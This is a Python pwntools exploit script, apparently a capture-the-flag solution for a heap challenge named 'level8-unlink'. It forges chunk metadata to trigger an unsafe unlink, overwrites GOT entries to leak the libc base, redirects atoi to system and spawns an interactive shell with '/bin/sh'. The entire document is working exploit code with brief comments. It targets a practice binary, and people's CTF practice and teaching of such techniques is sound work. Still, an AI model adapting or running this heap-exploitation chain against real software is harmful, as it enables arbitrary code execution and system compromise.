from pwn import *
context.log_level = "debug"

r = process("./level8-unlink")
#r = remote("pwn.sixstars.team", 22508)
elf = ELF("./level8-unlink")
libc = ELF("./libc.so.6")
info('PID: ' + str(r.pid))
pause()

pool = 0x6020C0

def add(size):
    r.sendlineafter(">> ", '1')
    r.sendlineafter("Size:", str(size))

def edit(index, data):
    r.sendlineafter(">> ", '2')
    r.sendlineafter("id:", str(index))
    r.sendafter("Content:", data)

def dele(index):
    r.sendlineafter(">> ", '3')
    r.sendlineafter("id:", str(index))
   
def exploit():
    # leak libc base address
    add(0x108)
    add(0x38)
    add(0xf8)
    add(0x68)

    payload = p64(0)                    # where the pool[1] points at
    payload += p64(0x21)
    payload += p64(pool+0x8-0x18)       # fake FD
    payload += p64(pool+0x8-0x10)       # fake BK
    payload += p64(0x20)
    payload = payload.ljust(0x30, 'a')
    payload += p64(0x30)
   
    edit(1, payload)                    
    dele(2)                             # unlink
                                        # change pool[1] to &pool[1]-0x18

    payload = 'a'*0x10
    payload += p64(elf.got['free'])     # change pool[0] to got['free']
    payload += p64(elf.got['puts'])     # change pool[1] to got['puts']
    payload += p64(0)                   # change pool[2] to 0 (because its size is 0, so useless)
    payload += p64(elf.got['atoi'])     # change pool[3] to got['atoi']
    edit(1, payload[:-1] + '\n')

    edit(0, p64(elf.plt['puts']+6)[:-1] + '\n')         # change got['free'] to plt['puts']+6
    dele(1)                                             # puts puts
    a = u64(r.recv(6) + '\x00'*2) - libc.sym['puts']    # leak libc
    libc.address = a
    info("libc: " + hex(a))
    info("system: " + hex(libc.sym['system']))

    # change atoi to system
    edit(3, p64(libc.sym['system'])[:-1] + '\n')        # change got['atoi'] to sym['system']
    r.sendlineafter(">> ", "/bin/sh\x00")               # system("/bin/sh")

    r.interactive()


if __name__ == "__main__":
    exploit()
